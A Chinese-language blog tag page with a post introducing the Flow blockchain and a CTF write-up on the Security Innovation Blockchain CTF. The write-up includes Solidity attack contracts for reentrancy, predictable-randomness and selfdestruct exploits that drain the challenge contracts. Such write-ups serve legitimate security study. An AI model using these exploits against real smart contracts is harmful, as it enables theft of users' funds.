<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: blockchain - 歐欸利恩的部落格</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="歐欸利恩的部落格"><meta name="msapplication-TileImage" content="/images/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="歐欸利恩的部落格"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="歐欸利恩的部落格"><meta property="og:url" content="http://oalieno.github.io/"><meta property="og:site_name" content="歐欸利恩的部落格"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://oalieno.github.io/img/og_image.png"><meta property="article:author" content="oalieno"><meta property="article:tag" content="blog, security, programming, coding, life"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://oalieno.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://oalieno.github.io"},"headline":"歐欸利恩的部落格","image":["http://oalieno.github.io/img/og_image.png"],"author":{"@type":"Person","name":"oalieno"},"publisher":{"@type":"Organization","name":"歐欸利恩的部落格","logo":{"@type":"ImageObject","url":{"text":"歐欸利恩的部落格","img":"/images/logo.svg"}}},"description":""}</script><link rel="icon" href="/images/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&amp;family=Material+Icons&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-LYLB67MBLS" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-LYLB67MBLS');</script><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img nolazy src="/images/logo.svg" alt="歐欸利恩的部落格" height="28"><p>歐欸利恩的部落格</p></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首頁</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">分類</a><a class="navbar-item" href="/tags">標籤</a><a class="navbar-item" href="/about">關於我</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">blockchain</a></li></ul></nav></div></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2021-02-26T16:00:00.000Z" title="2/27/2021, 12:00:00 AM">2021-02-27</time></span><i class="material-icons">schedule</i><span class="level-item">10 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/">區塊鍊</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/27/flow/">【項目介紹】Flow ( Dapper Labs )</a></h1><div class="content"><p>這個項目算是很新的項目，去年的 9/22 - 10/3 才在第一波 ICO，每人限購 1000 USDC，當時 ICO 的價格是一顆 FLOW 要價 0.1 USDC，到現在也漲了 200 倍了吧，只恨沒有買更多啊 Orz 不過要鎖倉一年，所以要到今年底才拿的回來，但是光是產生的利息就已經回本好幾倍了xD<br>
好了，廢話不多說，下面來介紹一下 flow 的特點。</p>
<h2 id="資源">資源</h2>
<p>這邊先放幾個連結，有興趣入門的可以看一下</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.onflow.org/primer">官方寫的入門文章</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.onflow.org/">官方的文檔</a></li>
<li><a target="_blank" rel="noopener" href="https://joshuahannan.medium.com/taking-your-first-steps-with-cadence-19dde86bbd0">國外大佬的入坑指南</a></li>
</ul>
<h2 id="特點">特點</h2>
<p>Flow 是專門為應用程式以及遊戲所開發的一條新的區塊鍊<br>
在鍊上面可以用 Cadence 這個程式語言撰寫 smart contract，對比隔壁棚的 Ethereum 用 Solidity 寫 smart contract</p>
<h3 id="Cadence-這個程式語言有什麼特點呢">Cadence 這個程式語言有什麼特點呢</h3>
<ul>
<li><strong>Resource-Oriented Programming</strong>
<ul>
<li>聽說是參考 facebook 的 Libra 用的 Move 語言</li>
<li>跟 Rust 的 ownership 很像</li>
<li>可以看看下面兩篇 papers，在講怎麼樣設計一個適合用在 smart contract 上的語言
<ul>
<li><a target="_blank" rel="noopener" href="https://src.acm.org/binaries/content/assets/src/2018/michael-coblenz.pdf">Obsidian: A Safer Blockchain Programming Language</a></li>
<li><a target="_blank" rel="noopener" href="http://www.cs.cmu.edu/~balzers/publications/digital_contracts_as_session_types.pdf">Resource-Aware Session Types for Digital Contracts</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Upgradable Smart Contract</strong>
<ul>
<li>多了一個 beta state 可以讓你盡情的 upgrade，在這個階段，如果使用這要用就要自行承擔風險囉，話是這樣說的</li>
<li>等到都測試完後，就可以正式 release 了，之後就跟隔壁棚 Ethereum 的 smart contract 一樣就不能再改他了</li>
</ul>
</li>
<li><strong>Built-in Logging Support</strong>
<ul>
<li>只會在 transaction 上標記一個記號，你想要看 log 就自己在離線執行一次就可以看到了，不像隔壁棚 Ethereum 把 log 儲存在鍊上面</li>
<li>在 Cadence 語言中就直接 <code>log(&quot;hi&quot;)</code> 就可以印 log 了，不像隔壁棚 Ethereum 還要先定義 event 再 emit</li>
</ul>
</li>
</ul>
<h3 id="Flow-這條區塊鍊有哪些特點呢">Flow 這條區塊鍊有哪些特點呢</h3>
<ul>
<li><strong>垂直分工 ( pipeline )</strong>，把問題切成四份，某種問題會有一種專門的節點負責處理
<ul>
<li>不像隔壁棚 Ethereum 尋求 sharding 的解決方式，用平行分工把所有交易切成很多子鍊，多了很多問題</li>
<li>分下面四種工作
<ul>
<li>Consensus Nodes    : 共識機制在此發功，Flow 使用 HotStuff 共識機制</li>
<li>Verification Nodes : 檢查正確性，取締違規者</li>
<li>Execution Nodes    : 執行交易附帶的那些計算工作，也就是 smart contract 裡面的程式</li>
<li>Collection Nodes   : 負責包裝交易們處理些雜事，再丟給 Consensus Nodes，用來提昇整體區塊鍊的效率</li>
</ul>
</li>
<li>總而言之
<ul>
<li>Consensus 和 Verification 這兩種 Node 是安全守門員負責讓 Flow 更安全</li>
<li>Execution 和 Collection 這兩種 Node 是瘋狂機器人負責讓 Flow 更有效率跑得更快</li>
</ul>
</li>
</ul>
</li>
<li>每個帳號裡面都可以有多個 smart contract，不像隔壁棚 Ethereum 的 smart contract 和 address 是一對一的關係</li>
<li>內建支援 <strong>multi-signature</strong>，每個 key 會有一個 weight，只有你提供的 key 們的 weight 加起來有 1000 就可以做事情了</li>
<li>聽官網介紹是說有<strong>帳號恢復機制</strong>，不清楚細節</li>
<li>強調說他遵守了資料庫系統的 ACID ( Atomic, Consistent, Isolated, and Durable ) 原則，因為根本上區塊鍊就是一個去中心化的資料庫</li>
</ul>
<h2 id="如何成為節點">如何成為節點</h2>
<p><a target="_blank" rel="noopener" href="https://docs.onflow.org/node-operation/node-setup">官方的文檔 - Setting Up a Flow Node</a></p>
<table>
<thead>
<tr>
<th>NODE TYPE</th>
<th>CPU</th>
<th>MEMORY</th>
<th>DISK</th>
</tr>
</thead>
<tbody>
<tr>
<td>Collection</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Consensus</td>
<td>2 coresv</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Execution</td>
<td>16 cores</td>
<td>128 GB</td>
<td>2 TB</td>
</tr>
<tr>
<td>Verification</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Access</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Make sure you have a sufficiently fast connection; we recommend at least 1Gbps, and 5Gbps is better.</p>
</blockquote>
<p>硬體要求還行，我的桌機好像還能跑，但是這個網速要求有點高啊<br>
而且還要填<a target="_blank" rel="noopener" href="https://www.onflow.org/node-validators">表單</a>申請，太中心化了啊<br>
然後<a target="_blank" rel="noopener" href="https://docs.onflow.org/node-operation/node-roles">這裡</a>有寫每種 node 要跑得話要 stake 多少顆 flow，最便宜也至少要 stake 135000 顆 flow，以目前的價格來看大概是 270 萬美金吧，我去</p>
<h2 id="Flow-目前的一些問題">Flow 目前的一些問題</h2>
<p>目前 Flow 還在初期階段，有些東西還沒搞好<br>
下面一些資訊是我在 discord 群看到的</p>
<blockquote>
<p>we still have a lot of things locked down in mainnet right now. The ability to create accounts is one of them. At this time only partnered wallets can create accounts. This will obviously be opened up in the future. At a minimum it won’t happen until fees are in place on mainnet.</p>
<ul>
<li>qvvg on discord</li>
</ul>
</blockquote>
<p>主網路還沒好啊，不能隨意創帳號<br>
需要他們合作的夥伴像是 blockto 才能創，可以用 <a target="_blank" rel="noopener" href="https://port.onflow.org/">https://port.onflow.org/</a> 這個創帳號的樣子<br>
還不夠去中心化啊</p>
<blockquote>
<p>Flow’s fee model is still under development, but will have transaction fees. The payer of a transaction can be separate from the authorizer, so dapps can easily pay for their users transactions. Flow keeps tx fees affordable and accessible for all.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>手續費的機制也還沒弄好啊</p>
<blockquote>
<p>Flow is an decentralized protocol being built in an open ecosystem - there is no formal roadmap but if you’d like to see areas people are currently expending effort you can take a look at issues currently in the GitHub repo <a target="_blank" rel="noopener" href="https://github.com/onflow/flow/issues">https://github.com/onflow/flow/issues</a> and feel free to create or comment on issues for anything that you think should exist on Flow.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>沒有正式的 roadmap</p>
<h2 id="Flow-的應用">Flow 的應用</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.nbatopshot.com/">NBA Top Shot</a>: NBA 主題的 NFT，可以讓你收藏你最愛的球員，以及他們得分的片段等</li>
<li><a target="_blank" rel="noopener" href="https://viv3.com/">VIV3</a>: 買賣 NFT 的平台</li>
<li><a target="_blank" rel="noopener" href="https://motogp-ignition.com/">MotoGP™ Ignition</a>: 類似 Ethereum 上的 <a target="_blank" rel="noopener" href="https://www.f1deltatime.com/">F1® Delta Time</a>，同一批開發人員的樣子，只是從 F1 賽車改成 MotoGP 摩托車，可以組裝自己的車車然後跟別人比賽，下個月 3/26 開賣</li>
<li><a target="_blank" rel="noopener" href="https://www.cryptokitties.co/">CryptoKitties</a>: 還在計畫從 Ethereum 遷移到 Flow，不知道是哪時候</li>
</ul>
<h2 id="總結">總結</h2>
<p>Flow 提出了很多方案來改進去中心化應用面臨到的問題，接下來就要靜待時間的考驗，等潮水退了就知道 Flow 有沒有穿褲子了</p>
<h2 id="Flow-to-the-Moon-🚀"><strong>Flow to the Moon 🚀</strong></h2>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2021/02/27/flow/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-06-06T16:00:00.000Z" title="6/7/2019, 12:00:00 AM">2019-06-07</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/06/07/blockchain-ctf/">【CTF Writeups】Security Innovation Blockchain CTF</a></h1><div class="content"><p>這邊是紀錄我寫 <a target="_blank" rel="noopener" href="https://blockchain-ctf.securityinnovation.com/#/">Security Innovation Blockchain CTF</a> 的 Writeups</p>
<h2 id="Donation">Donation</h2>
<p>這題是簽到題<br>
就只是讓我們呼叫合約裡面的這個函式 <code>withdrawDonationsFromTheSuckersWhoFellForIt</code></p>
<h2 id="Lock-Box">Lock Box</h2>
<p>這題有個 <code>private</code> 的 <code>pin</code> 變數，但是 <code>private</code> 只是代表那個變數沒有 <code>getter</code> 函式，把合約的狀態抓下來就看光光啦<br>
使用 <a target="_blank" rel="noopener" href="https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-getstorageat"><code>web3.eth.getStorageAt</code></a> 這個函式<br>
父合約的變數會在子合約的變數的前面<br>
所以 position 0 的位址是 <code>authorizedToPlay</code>，而 position 1 的位址就是 <code>pin</code><br>
變數在 storage 裡面怎麼擺的可以參考這篇 <a target="_blank" rel="noopener" href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/">Understanding Ethereum Smart Contract Storage</a></p>
<h2 id="Piggy-Bank">Piggy Bank</h2>
<p>這題直接呼叫 <code>collectFunds</code> 就好了<br>
只有 <code>PiggyBank</code> 的 <code>collectFunds</code> 有 <code>onlyOwner</code>，<code>CharliesPiggyBank</code> 的 <code>collectFunds</code> 沒有 <code>onlyOwner</code></p>
<h2 id="SI-Token-Sale">SI Token Sale</h2>
<p>這題的 <code>purchaseTokens</code> 沒有用 SafeMath，也沒有檢查 <code>_value</code> 要大於 <code>feeAmount</code><br>
先轉個 <code>0.000001</code> 給合約，這樣 <code>0.000001 - 0.00001</code> 就會 underflow 變成很大的數字，就得到了超多的 token<br>
然後再用 <code>refundTokens</code> 就可以半價把 token 換成 ether 錢錢了</p>
<h2 id="Secure-Bank">Secure Bank</h2>
<p><code>SecureBank</code> 的 <code>withdraw</code> 和 <code>MembersBank</code> 的 <code>withdraw</code> 其中的 <code>_value</code> 參數形態不一樣<br>
他們會被看成是不一樣的函式，所以會有兩個不一樣的型態 <code>withdraw</code> 可以呼叫<br>
而 <code>MembersBank</code> 的 <code>withdraw</code> 沒有檢查是不是本人，所以就直接把 contract creator 的錢領走</p>
<h2 id="Lottery">Lottery</h2>
<p>這題要猜 <code>entropy^entropy2</code> 的值，猜到就可以拿走裡面的錢錢</p>
<p><code>entropy = blockhash(block.number)</code>，但是我們沒辦法知道這個 block 的 blockhash，因為這個 block 還沒算完<br>
但這樣寫不會有錯誤，只是出來的值會是 <code>0</code><br>
既然 <code>entropy = 0</code> 那就只剩 <code>entropy2</code>，而 <code>entropy2</code> 是根據 <code>msg.sender</code> 來的<br>
所以我們可以直接算出 <code>_seed</code> 的值<br>
可以直接用 <a target="_blank" rel="noopener" href="https://remix.ethereum.org">remix</a> 寫個簡單的 smart contract 幫我們算那個值，然後利用 <code>event</code> 來印出那個值 ( 當 print 用 )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract test &#123;</span><br><span class="line">    event Log(bytes32 value);</span><br><span class="line"></span><br><span class="line">    function go () public &#123;</span><br><span class="line">        emit Log(keccak256(abi.encodePacked(msg.sender)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或是直接寫一個攻擊合約，去呼叫 <code>play</code> 函式<br>
記得要先把這個合約加到 <code>authorizedToPlay</code>，如果是 gas 不夠就調高 gas limit 吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">import &quot;./challenge.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    function exploit(address payable _target) public payable &#123;</span><br><span class="line">        Lottery target = Lottery(_target);</span><br><span class="line"></span><br><span class="line">        bytes32 entropy2 = keccak256(abi.encodePacked(this));</span><br><span class="line">        uint256 seeds = uint256(entropy2);</span><br><span class="line"></span><br><span class="line">        target.play.value(msg.value)(seeds);</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Trust-Fund">Trust Fund</h2>
<p>這題是經典的 reentrant attack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract TrustFund &#123;</span><br><span class="line">    function withdraw() external &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997;</span><br><span class="line">    uint count = 10;</span><br><span class="line"></span><br><span class="line">    function () external payable &#123;</span><br><span class="line">        if (count &gt; 0) &#123;</span><br><span class="line">            count--;</span><br><span class="line">            TrustFund trust = TrustFund(target);</span><br><span class="line">            trust.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit () public &#123;</span><br><span class="line">        TrustFund trust = TrustFund(target);</span><br><span class="line">        trust.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw () public &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Heads-or-Tails">Heads or Tails</h2>
<p>這題跟 Lottery 很像，不過用的是上一個 block 的 blockhash<br>
那就寫個攻擊合約去呼叫 <code>play</code>，就可以算出一樣的 <code>entropy</code><br>
給 <code>0.1 ether</code> 能賺 <code>0.05 ether</code>，所以玩個 20 次就把錢全部撈出來啦<br>
記得要寫 <code>fallback</code> 函式才能接錢進來呀 ( 我這裡卡超久der )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract HeadsOrTails &#123;</span><br><span class="line">    function play(bool _heads) external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af;</span><br><span class="line"></span><br><span class="line">	function () external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function exploit () public payable &#123;</span><br><span class="line">        bytes32 entropy = blockhash(block.number - 1);</span><br><span class="line">        bool coinFlip = (entropy[0] &amp; &#x27;\x01&#x27;) == &#x27;\x01&#x27;;</span><br><span class="line"></span><br><span class="line">        HeadsOrTails heads = HeadsOrTails(target);</span><br><span class="line"></span><br><span class="line">		for (uint i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">			heads.play.value(0.1 ether)(coinFlip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Record-Label">Record Label</h2>
<p>這題的題目很長，主要的邏輯就是你領錢的時候會被 <code>royalties</code> 抽成，<code>manager</code> 會抽成 80 趴的錢錢<br>
所以如果直接呼叫 <code>withdrawFundsAndPayRoyalties</code> 就可以拿到 <code>0.2 ether</code>，<code>royalties</code> 抽走 <code>0.8 ether</code>，這題就解掉了 ( 題目合約 <code>balance = 0</code> )<br>
不過正確的解法 ( 我全都要 ) 應該是找出 <code>_manager</code> 的地址，然後呼叫 <code>addRoyaltyReceiver</code> 把 <code>receiverToPercentOfProfit</code> 這個 mapping 中 <code>_manager</code> 的 percent 覆寫成 0<br>
這樣去領錢就不會被抽成了</p>
<h2 id="Slot-Machine">Slot Machine</h2>
<p>這題的題目很短，就一個 <code>fallback</code> 函式<br>
但是第一行限制一次只能匯款 <code>1 szabo</code> ( <code>0.000001 ether</code> )<br>
目標是要讓這個合約的 balance 大於等於 <code>5 ether</code>，他就會把所有錢錢都給你<br>
其中一個不透過 <code>fallback</code> 給錢的方法就是用 <code>selfdestruct</code><br>
<code>selfdestruct</code> 就是把合約清除掉，在被清除掉之前，這個合約可以把他的錢錢匯款給一個帳戶，而這個匯款的動作不會經過 <code>fallback</code> 函式<br>
寫一個攻擊合約，並給他 <code>5 ether</code>，讓他自我毀滅，並在毀滅之前把 <code>5 ether</code> 匯款給題目合約</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    function exploit () public payable &#123;</span><br><span class="line">        selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://f3real.github.io/tag/ethereum.html">https://f3real.github.io/tag/ethereum.html</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2759">https://xz.aliyun.com/t/2759</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/06/07/blockchain-ctf/#more">Read more</a></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.png" alt="oalieno"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">oalieno</p><p class="is-size-6 is-block">資安研究員</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">33</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">46</p></a></div></div></nav><div class="level"><a class="level-item button is-primary" href="https://github.com/oalieno" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/oalieno"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/oalieno"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Linkedin" href="https://www.linkedin.com/in/oalieno/"><i class="fab fa-linkedin"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"><span class="level-start"><span class="level-item">區塊鍊</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"><span class="level-start"><span class="level-item">演算法</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%A8%8B%E5%BC%8F/"><span class="level-start"><span class="level-item">程式</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/"><span class="level-start"><span class="level-item">資安</span></span><span class="level-end"><span class="level-item tag">16</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/reverse/"><span class="level-start"><span class="level-item">reverse</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/writeups/"><span class="level-start"><span class="level-item">writeups</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><figure class="media-left"><a class="image" href="/2022/11/12/flare-on-9/zh-tw/"><p align="center"><img data-src="/images/flare-on-9.png" class=" lazyload" alt="【Writeups】Flare-on 9"></p></a></figure><div class="media-content"><p class="date"><time dateTime="2022-11-11T16:00:00.000Z">2022-11-12</time></p><p class="title"><a href="/2022/11/12/flare-on-9/zh-tw/">【Writeups】Flare-on 9</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a> / <a href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-08T16:00:00.000Z">2022-11-09</time></p><p class="title"><a href="/2022/11/09/cve-2022-41049/">【漏洞分析】CVE-2022-41049</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T16:00:00.000Z">2022-11-01</time></p><p class="title"><a href="/2022/11/01/MpDlpCmd/en/">【Windows Security】MpDlpCmd.exe</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-03-29T16:00:00.000Z">2022-03-30</time></p><p class="title"><a href="/2022/03/30/blog03/">【部落格開發日誌】0x03</a></p><p class="categories"><a href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-26T16:00:00.000Z">2021-02-27</time></p><p class="title"><a href="/2021/02/27/flow/">【項目介紹】Flow ( Dapper Labs )</a></p><p class="categories"><a 